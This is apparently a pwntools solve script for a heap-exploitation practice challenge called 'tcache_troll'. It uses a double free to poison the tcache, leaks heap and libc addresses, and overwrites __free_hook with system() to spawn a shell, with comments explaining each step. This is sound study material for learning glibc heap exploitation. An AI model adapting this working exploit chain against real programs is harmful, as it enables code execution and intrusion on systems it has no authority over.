#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./tcache_troll', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc 

gs = """
b *main

b *main+260

b *main+386
b *main+594

b *main+745

b *main+928
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "read" option.
# Returns 8 bytes.
def read(index):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    r = io.recv(8)
    io.recvuntil(b"> ")
    return r

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- LEAK A HEAP ADDRESS -=-=-=

# Request a 0x90-sized "dup" chunk.
# Freeing this when the 0x90 tcache count is >=7 will link it into the unsortedbin.
dup = malloc(0x88, b"dup")

# Request a minimum-sized chunk to guard against consolidation with the top.
# Write the string "/bin/sh" into it for use with the free hook later.
binsh = malloc(0x18, b"/bin/sh\0")

# Leverage the double-free bug to link the "dup" chunk into the 0x90 tcachebin twice.
free(dup)
free(dup)

# Request the same "dup" chunk from the tcache, label it "leaker" this time.
leaker = malloc(0x88, b"leaker")

# Free the "dup" chunk once more to write tcache metadata into the "leaker" chunk.
free(dup)

# Leak the address of the "dup" chunk's user data.
# Subtract 0x10 to account for chunk metadata, then subtract 0x250 (the size of the tcache chunk) to yield the heap start address.
heap = (unpack(read(leaker)) - 0x10) - 0x250
success(f"heap @ 0x{heap:02x}")


# =-=-=- LEAK UNSORTEDBIN ADDRESS -=-=-=

# Link a fake chunk overlapping the tcache into the tcache.
malloc(0x88, pack(heap + 0x10))

# Request the fake chunk overlapping the tcache, use it to set the 0x90 tcache count to 7.
# Point the 0x90 tcache slot at the tcache entry fields.
malloc(0x88, b"Y"*8) # Allocates the "dup" chunk.
malloc(0x88, p8(0)*7 + p8(7) + p8(0)*56 + pack(0)*7 + pack(heap + 0x50))

# Free the "dup" chunk into the unsortedbin, writing the unsortedbin address into the "leaker" chunk.
free(dup)

# Leak the address of the unsortedbin.
# Subtract 0x60 to find the start of the main arena, then subtract the main arena's offset to yield the libc.so load address.
libc.address = (unpack(read(leaker)) - 0x60) - libc.sym.main_arena
success(f"libc @ 0x{libc.address:02x}")


# =-=-=- OVERWRITE THE FREE HOOK -=-=-=

# Request the 0x90 chunk overlapping the tcache.
# Point the 0x20 tcache slot at the free hook.
malloc(0x88, pack(libc.sym.__free_hook))

# Request the fake chunk overlapping the free hook, write the address of system() there.
malloc(0x18, pack(libc.sym.system))

# Free a chunk containing the string "/bin/sh" to execute system("/bin/sh").
free(binsh)

# =============================================================================

io.interactive()